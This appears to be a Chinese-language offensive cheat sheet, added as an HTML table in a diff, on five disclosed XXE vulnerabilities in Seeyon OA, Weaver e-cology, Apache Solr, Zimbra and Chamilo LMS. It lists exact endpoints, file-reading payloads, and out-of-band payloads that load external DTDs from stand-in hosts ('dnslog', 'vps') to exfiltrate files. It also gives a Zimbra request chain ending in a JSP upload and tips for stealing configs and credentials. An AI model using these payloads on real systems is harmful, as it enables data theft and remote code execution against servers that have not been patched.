@@ -1,0 +1,41 @@
+<p>下表 5 个案例均来自公开披露的真实漏洞，接口路径与参数保持原始写法；带外（OOB）与带内回显两种形态都覆盖到了。</p>
+<table class="case-table">
+<thead>
+<tr><th>位置（接口 / 参数）</th><th>漏洞成因</th><th>关键载荷</th></tr>
+</thead>
+<tbody>
+<tr>
+<td>致远互联 OA V5 / G6（V6.0 及以上全系列）<code>POST /seeyon/m-signature/RunSignature/run/getAjaxDataServlet</code>，表单参数 <code>S=ajaxColManager&amp;M=colDelLock&amp;imgvalue=...&amp;xmlValue=</code>（另带 <code>signwidth</code>、<code>signheight</code>）</td>
+<td>未授权 XXE（QVD-2026-30027）。解析结果随签名页面回显，直接读出 <code>win.ini</code>；换路径同理可读配置、源码，属"签名接口顺带解析 XML"的典型</td>
+<td><code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"&gt;]&gt;</code>，再在 <code>&lt;d Index="VALUE"&gt;&amp;xxe;&lt;/d&gt;</code> 处引用实体</td>
+</tr>
+<tr>
+<td>泛微 e-cology <code>POST /rest/ofs/ReceiveTodoRequestByXml</code>，<code>Content-Type: application/xml</code>；同型接口还有 <code>ReceiveCCRequestByXml</code>、<code>ProcessOverRequestByXml</code>、<code>ProcessDoneRequestByXml</code>、<code>deleteUserRequestInfoByXml</code></td>
+<td>后端 <code>DocumentHelper.parseText()</code> 未禁用 DTD，属盲 XXE：无回显，靠 dnslog 回连确认；外挂 DTD 可外带文件内容、进一步探测内网</td>
+<td><code>&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM "http://dnslog/xxe.dtd"&gt; %remote; %send;]&gt;</code>，请求体写 <code>&amp;send;</code></td>
+</tr>
+<tr>
+<td>Apache Solr &lt; 7.1 <code>GET /solr/demo/select?q=&lt;XML 文档&gt;&amp;wt=xml&amp;defType=xmlparser</code></td>
+<td>xmlparser 解析入口未关外部实体，带内回显 <code>/etc/passwd</code>（CVE-2017-12629）。同版本还可用 <code>POST /solr/demo/config</code> 添加 <code>RunExecutableListener</code> 升级为命令执行</td>
+<td>q 参数整体塞 XML：<code>&lt;!DOCTYPE root [&lt;!ENTITY % ext SYSTEM "http://vps/do.dtd"&gt; %ext; %ent;]&gt;&lt;r&gt;&amp;data;&lt;/r&gt;</code>，外挂 DTD 里用 CDATA 包裹 <code>file:///etc/passwd</code></td>
+</tr>
+<tr>
+<td>Zimbra Collaboration &lt; 8.8.11 <code>POST /Autodiscover/Autodiscover.xml</code>，实体引用写在 <code>&lt;AcceptableResponseSchema&gt;</code> 元素内</td>
+<td>CVE-2019-9670，单个 XXE 打成完整 RCE 链：<code>POST /service/soap</code> 换取 token &rarr; <code>POST /service/proxy?target=https://127.0.0.1:7071/service/admin/soap</code> 提权 &rarr; <code>POST /service/extension/clientUploader/upload</code> 落地 jsp</td>
+<td>外部 DTD + CDATA 包裹读取 <code>file:../conf/localconfig.xml</code>，从中取 <code>key="ldap_password"</code></td>
+</tr>
+<tr>
+<td>Chamilo LMS &lt; 1.11.38 <code>POST /main/exercise/export/exercise_import.inc.php</code>（同型 <code>/main/session/session_import.php</code>、<code>/plugin/ImsLti/...</code>）</td>
+<td>CVE-2026-33737。代码用 <code>simplexml_load_string()</code> / <code>new SimpleXMLElement()</code> 且带 <code>LIBXML_NOENT</code>，低权限账号即可读配置与密钥，是 PHP 侧同型问题的标准样本</td>
+<td><code>&lt;!DOCTYPE xxe [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;</code> 随 XML 导入包一起提交</td>
+</tr>
+</tbody>
+</table>
+
+<h4>共性规律</h4>
+<ul>
+<li>先找"这个请求是不是 XML"：<code>Content-Type: application/xml</code>、<code>application/soap+xml</code>、multipart 里的 <code>.xml</code>、SVG 上传、DOCX/XLSX 解析、SAML 断言。</li>
+<li>有回显：把实体放进一定会被回显的字段（姓名、备注、签名值、<code>LocationConstraint</code>）；无回显：外部 DTD + 参数实体带外（dnslog / 自建 HTTP 服务）。</li>
+<li>PHP 侧两个开关：<code>LIBXML_NOENT</code>（实体替换）与 <code>libxml_disable_entity_loader(false)</code>（PHP &lt; 8.0）；Java 侧 dom4j <code>parseText()</code>、SAXReader 默认就带 DTD，风险更高。</li>
+<li>读含 <code>&lt;</code> 的文件（源码、XML 配置）必须走 CDATA 或 <code>php://filter/convert.base64-encode</code>，否则结构被破坏，只会看到"解析失败"。</li>
+</ul>
